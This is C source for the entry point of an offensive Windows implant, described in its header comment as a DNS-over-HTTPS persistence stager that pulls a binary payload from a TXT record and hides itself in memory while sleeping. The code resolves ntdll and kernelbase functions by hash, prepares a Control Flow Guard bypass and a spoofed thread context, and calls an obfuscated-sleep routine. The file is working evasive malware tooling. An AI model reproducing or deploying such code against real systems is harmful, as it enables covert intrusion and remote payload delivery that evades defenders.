/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#include "common.h"

D_SEC(B) VOID WINAPI Start( VOID )
{
	HMODULE       Mod;
	CONTEXT       Ctx;
	INSTANCE      Ins;
	LARGE_INTEGER Del;
	UCHAR         Stk[0x100];

	Ins.kb.Base = PebGetModule( H_KERNELBASE );
	Ins.nt.Base = PebGetModule( H_NTDLL );
	Ins.Buffer  = C_PTR( _GET_BEG() );
	Ins.Length  = U_PTR( _GET_END() ) - U_PTR( _GET_BEG() );

	if ( Ins.kb.Base ) {
		Ins.kb.SetProcessValidCallTargets = PeGetFuncEat( Ins.kb.Base, H_SETPROCESSVALIDCALLTARGETS );
	};

	Ins.nt.NtSignalAndWaitForSingleObject = PeGetFuncEat( Ins.nt.Base, H_NTSIGNALANDWAITFORSINGLEOBJECT );
	Ins.nt.NtQueryInformationProcess      = PeGetFuncEat( Ins.nt.Base, H_NTQUERYINFORMATIONPROCESS );
	Ins.nt.NtProtectVirtualMemory         = PeGetFuncEat( Ins.nt.Base, H_NTPROTECTVIRTUALMEMORY );
	Ins.nt.NtWaitForSingleObject          = PeGetFuncEat( Ins.nt.Base, H_NTWAITFORSINGLEOBJECT );
	Ins.nt.NtDeviceIoControlFile          = PeGetFuncEat( Ins.nt.Base, H_NTDEVICEIOCONTROLFILE );
	Ins.nt.RtlInitUnicodeString           = PeGetFuncEat( Ins.nt.Base, H_RTLINITUNICODESTRING );
	Ins.nt.NtAlertResumeThread            = PeGetFuncEat( Ins.nt.Base, H_NTALERTRESUMETHREAD );
	Ins.nt.NtSetContextThread             = PeGetFuncEat( Ins.nt.Base, H_NTSETCONTEXTTHREAD );
	Ins.nt.NtGetContextThread             = PeGetFuncEat( Ins.nt.Base, H_NTGETCONTEXTTHREAD );
	Ins.nt.NtTerminateThread              = PeGetFuncEat( Ins.nt.Base, H_NTTERMINATETHREAD );
	Ins.nt.RtlCaptureContext              = PeGetFuncEat( Ins.nt.Base, H_RTLCAPTURECONTEXT );
	Ins.nt.NtDelayExecution               = PeGetFuncEat( Ins.nt.Base, H_NTDELAYEXECUTION );
	Ins.nt.NtQueueApcThread               = PeGetFuncEat( Ins.nt.Base, H_NTQUEUEAPCTHREAD );
	Ins.nt.NtCreateThreadEx               = PeGetFuncEat( Ins.nt.Base, H_NTCREATETHREADEX );
	Ins.nt.RtlAllocateHeap                = PeGetFuncEat( Ins.nt.Base, H_RTLALLOCATEHEAP );
	Ins.nt.NtCreateEvent                  = PeGetFuncEat( Ins.nt.Base, H_NTCREATEEVENT );
	Ins.nt.NtOpenThread                   = PeGetFuncEat( Ins.nt.Base, H_NTOPENTHREAD );
	Ins.nt.RtlFreeHeap                    = PeGetFuncEat( Ins.nt.Base, H_RTLFREEHEAP );
	Ins.nt.NtTestAlert                    = PeGetFuncEat( Ins.nt.Base, H_NTTESTALERT );
	Ins.nt.NtOpenFile                     = PeGetFuncEat( Ins.nt.Base, H_NTOPENFILE );
	Ins.nt.NtContinue                     = PeGetFuncEat( Ins.nt.Base, H_NTCONTINUE );
	Ins.nt.ExitThread                     = PeGetFuncEat( Ins.nt.Base, H_EXITTHREAD );
	Ins.nt.NtClose                        = PeGetFuncEat( Ins.nt.Base, H_NTCLOSE );

	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );
	RtlSecureZeroMemory( Stk, 0x100 );

	Ctx.ContextFlags = CONTEXT_FULL;
	Ctx.Rsp          = U_PTR( &Stk[0x100 - 1] );
	Ctx.Rip          = U_PTR( Ins.nt.RtlFreeHeap );
	Del.QuadPart     = -( 90000 * 10000 );

	ObfuscateSleep( &Ins, &Ctx, &Del );
};
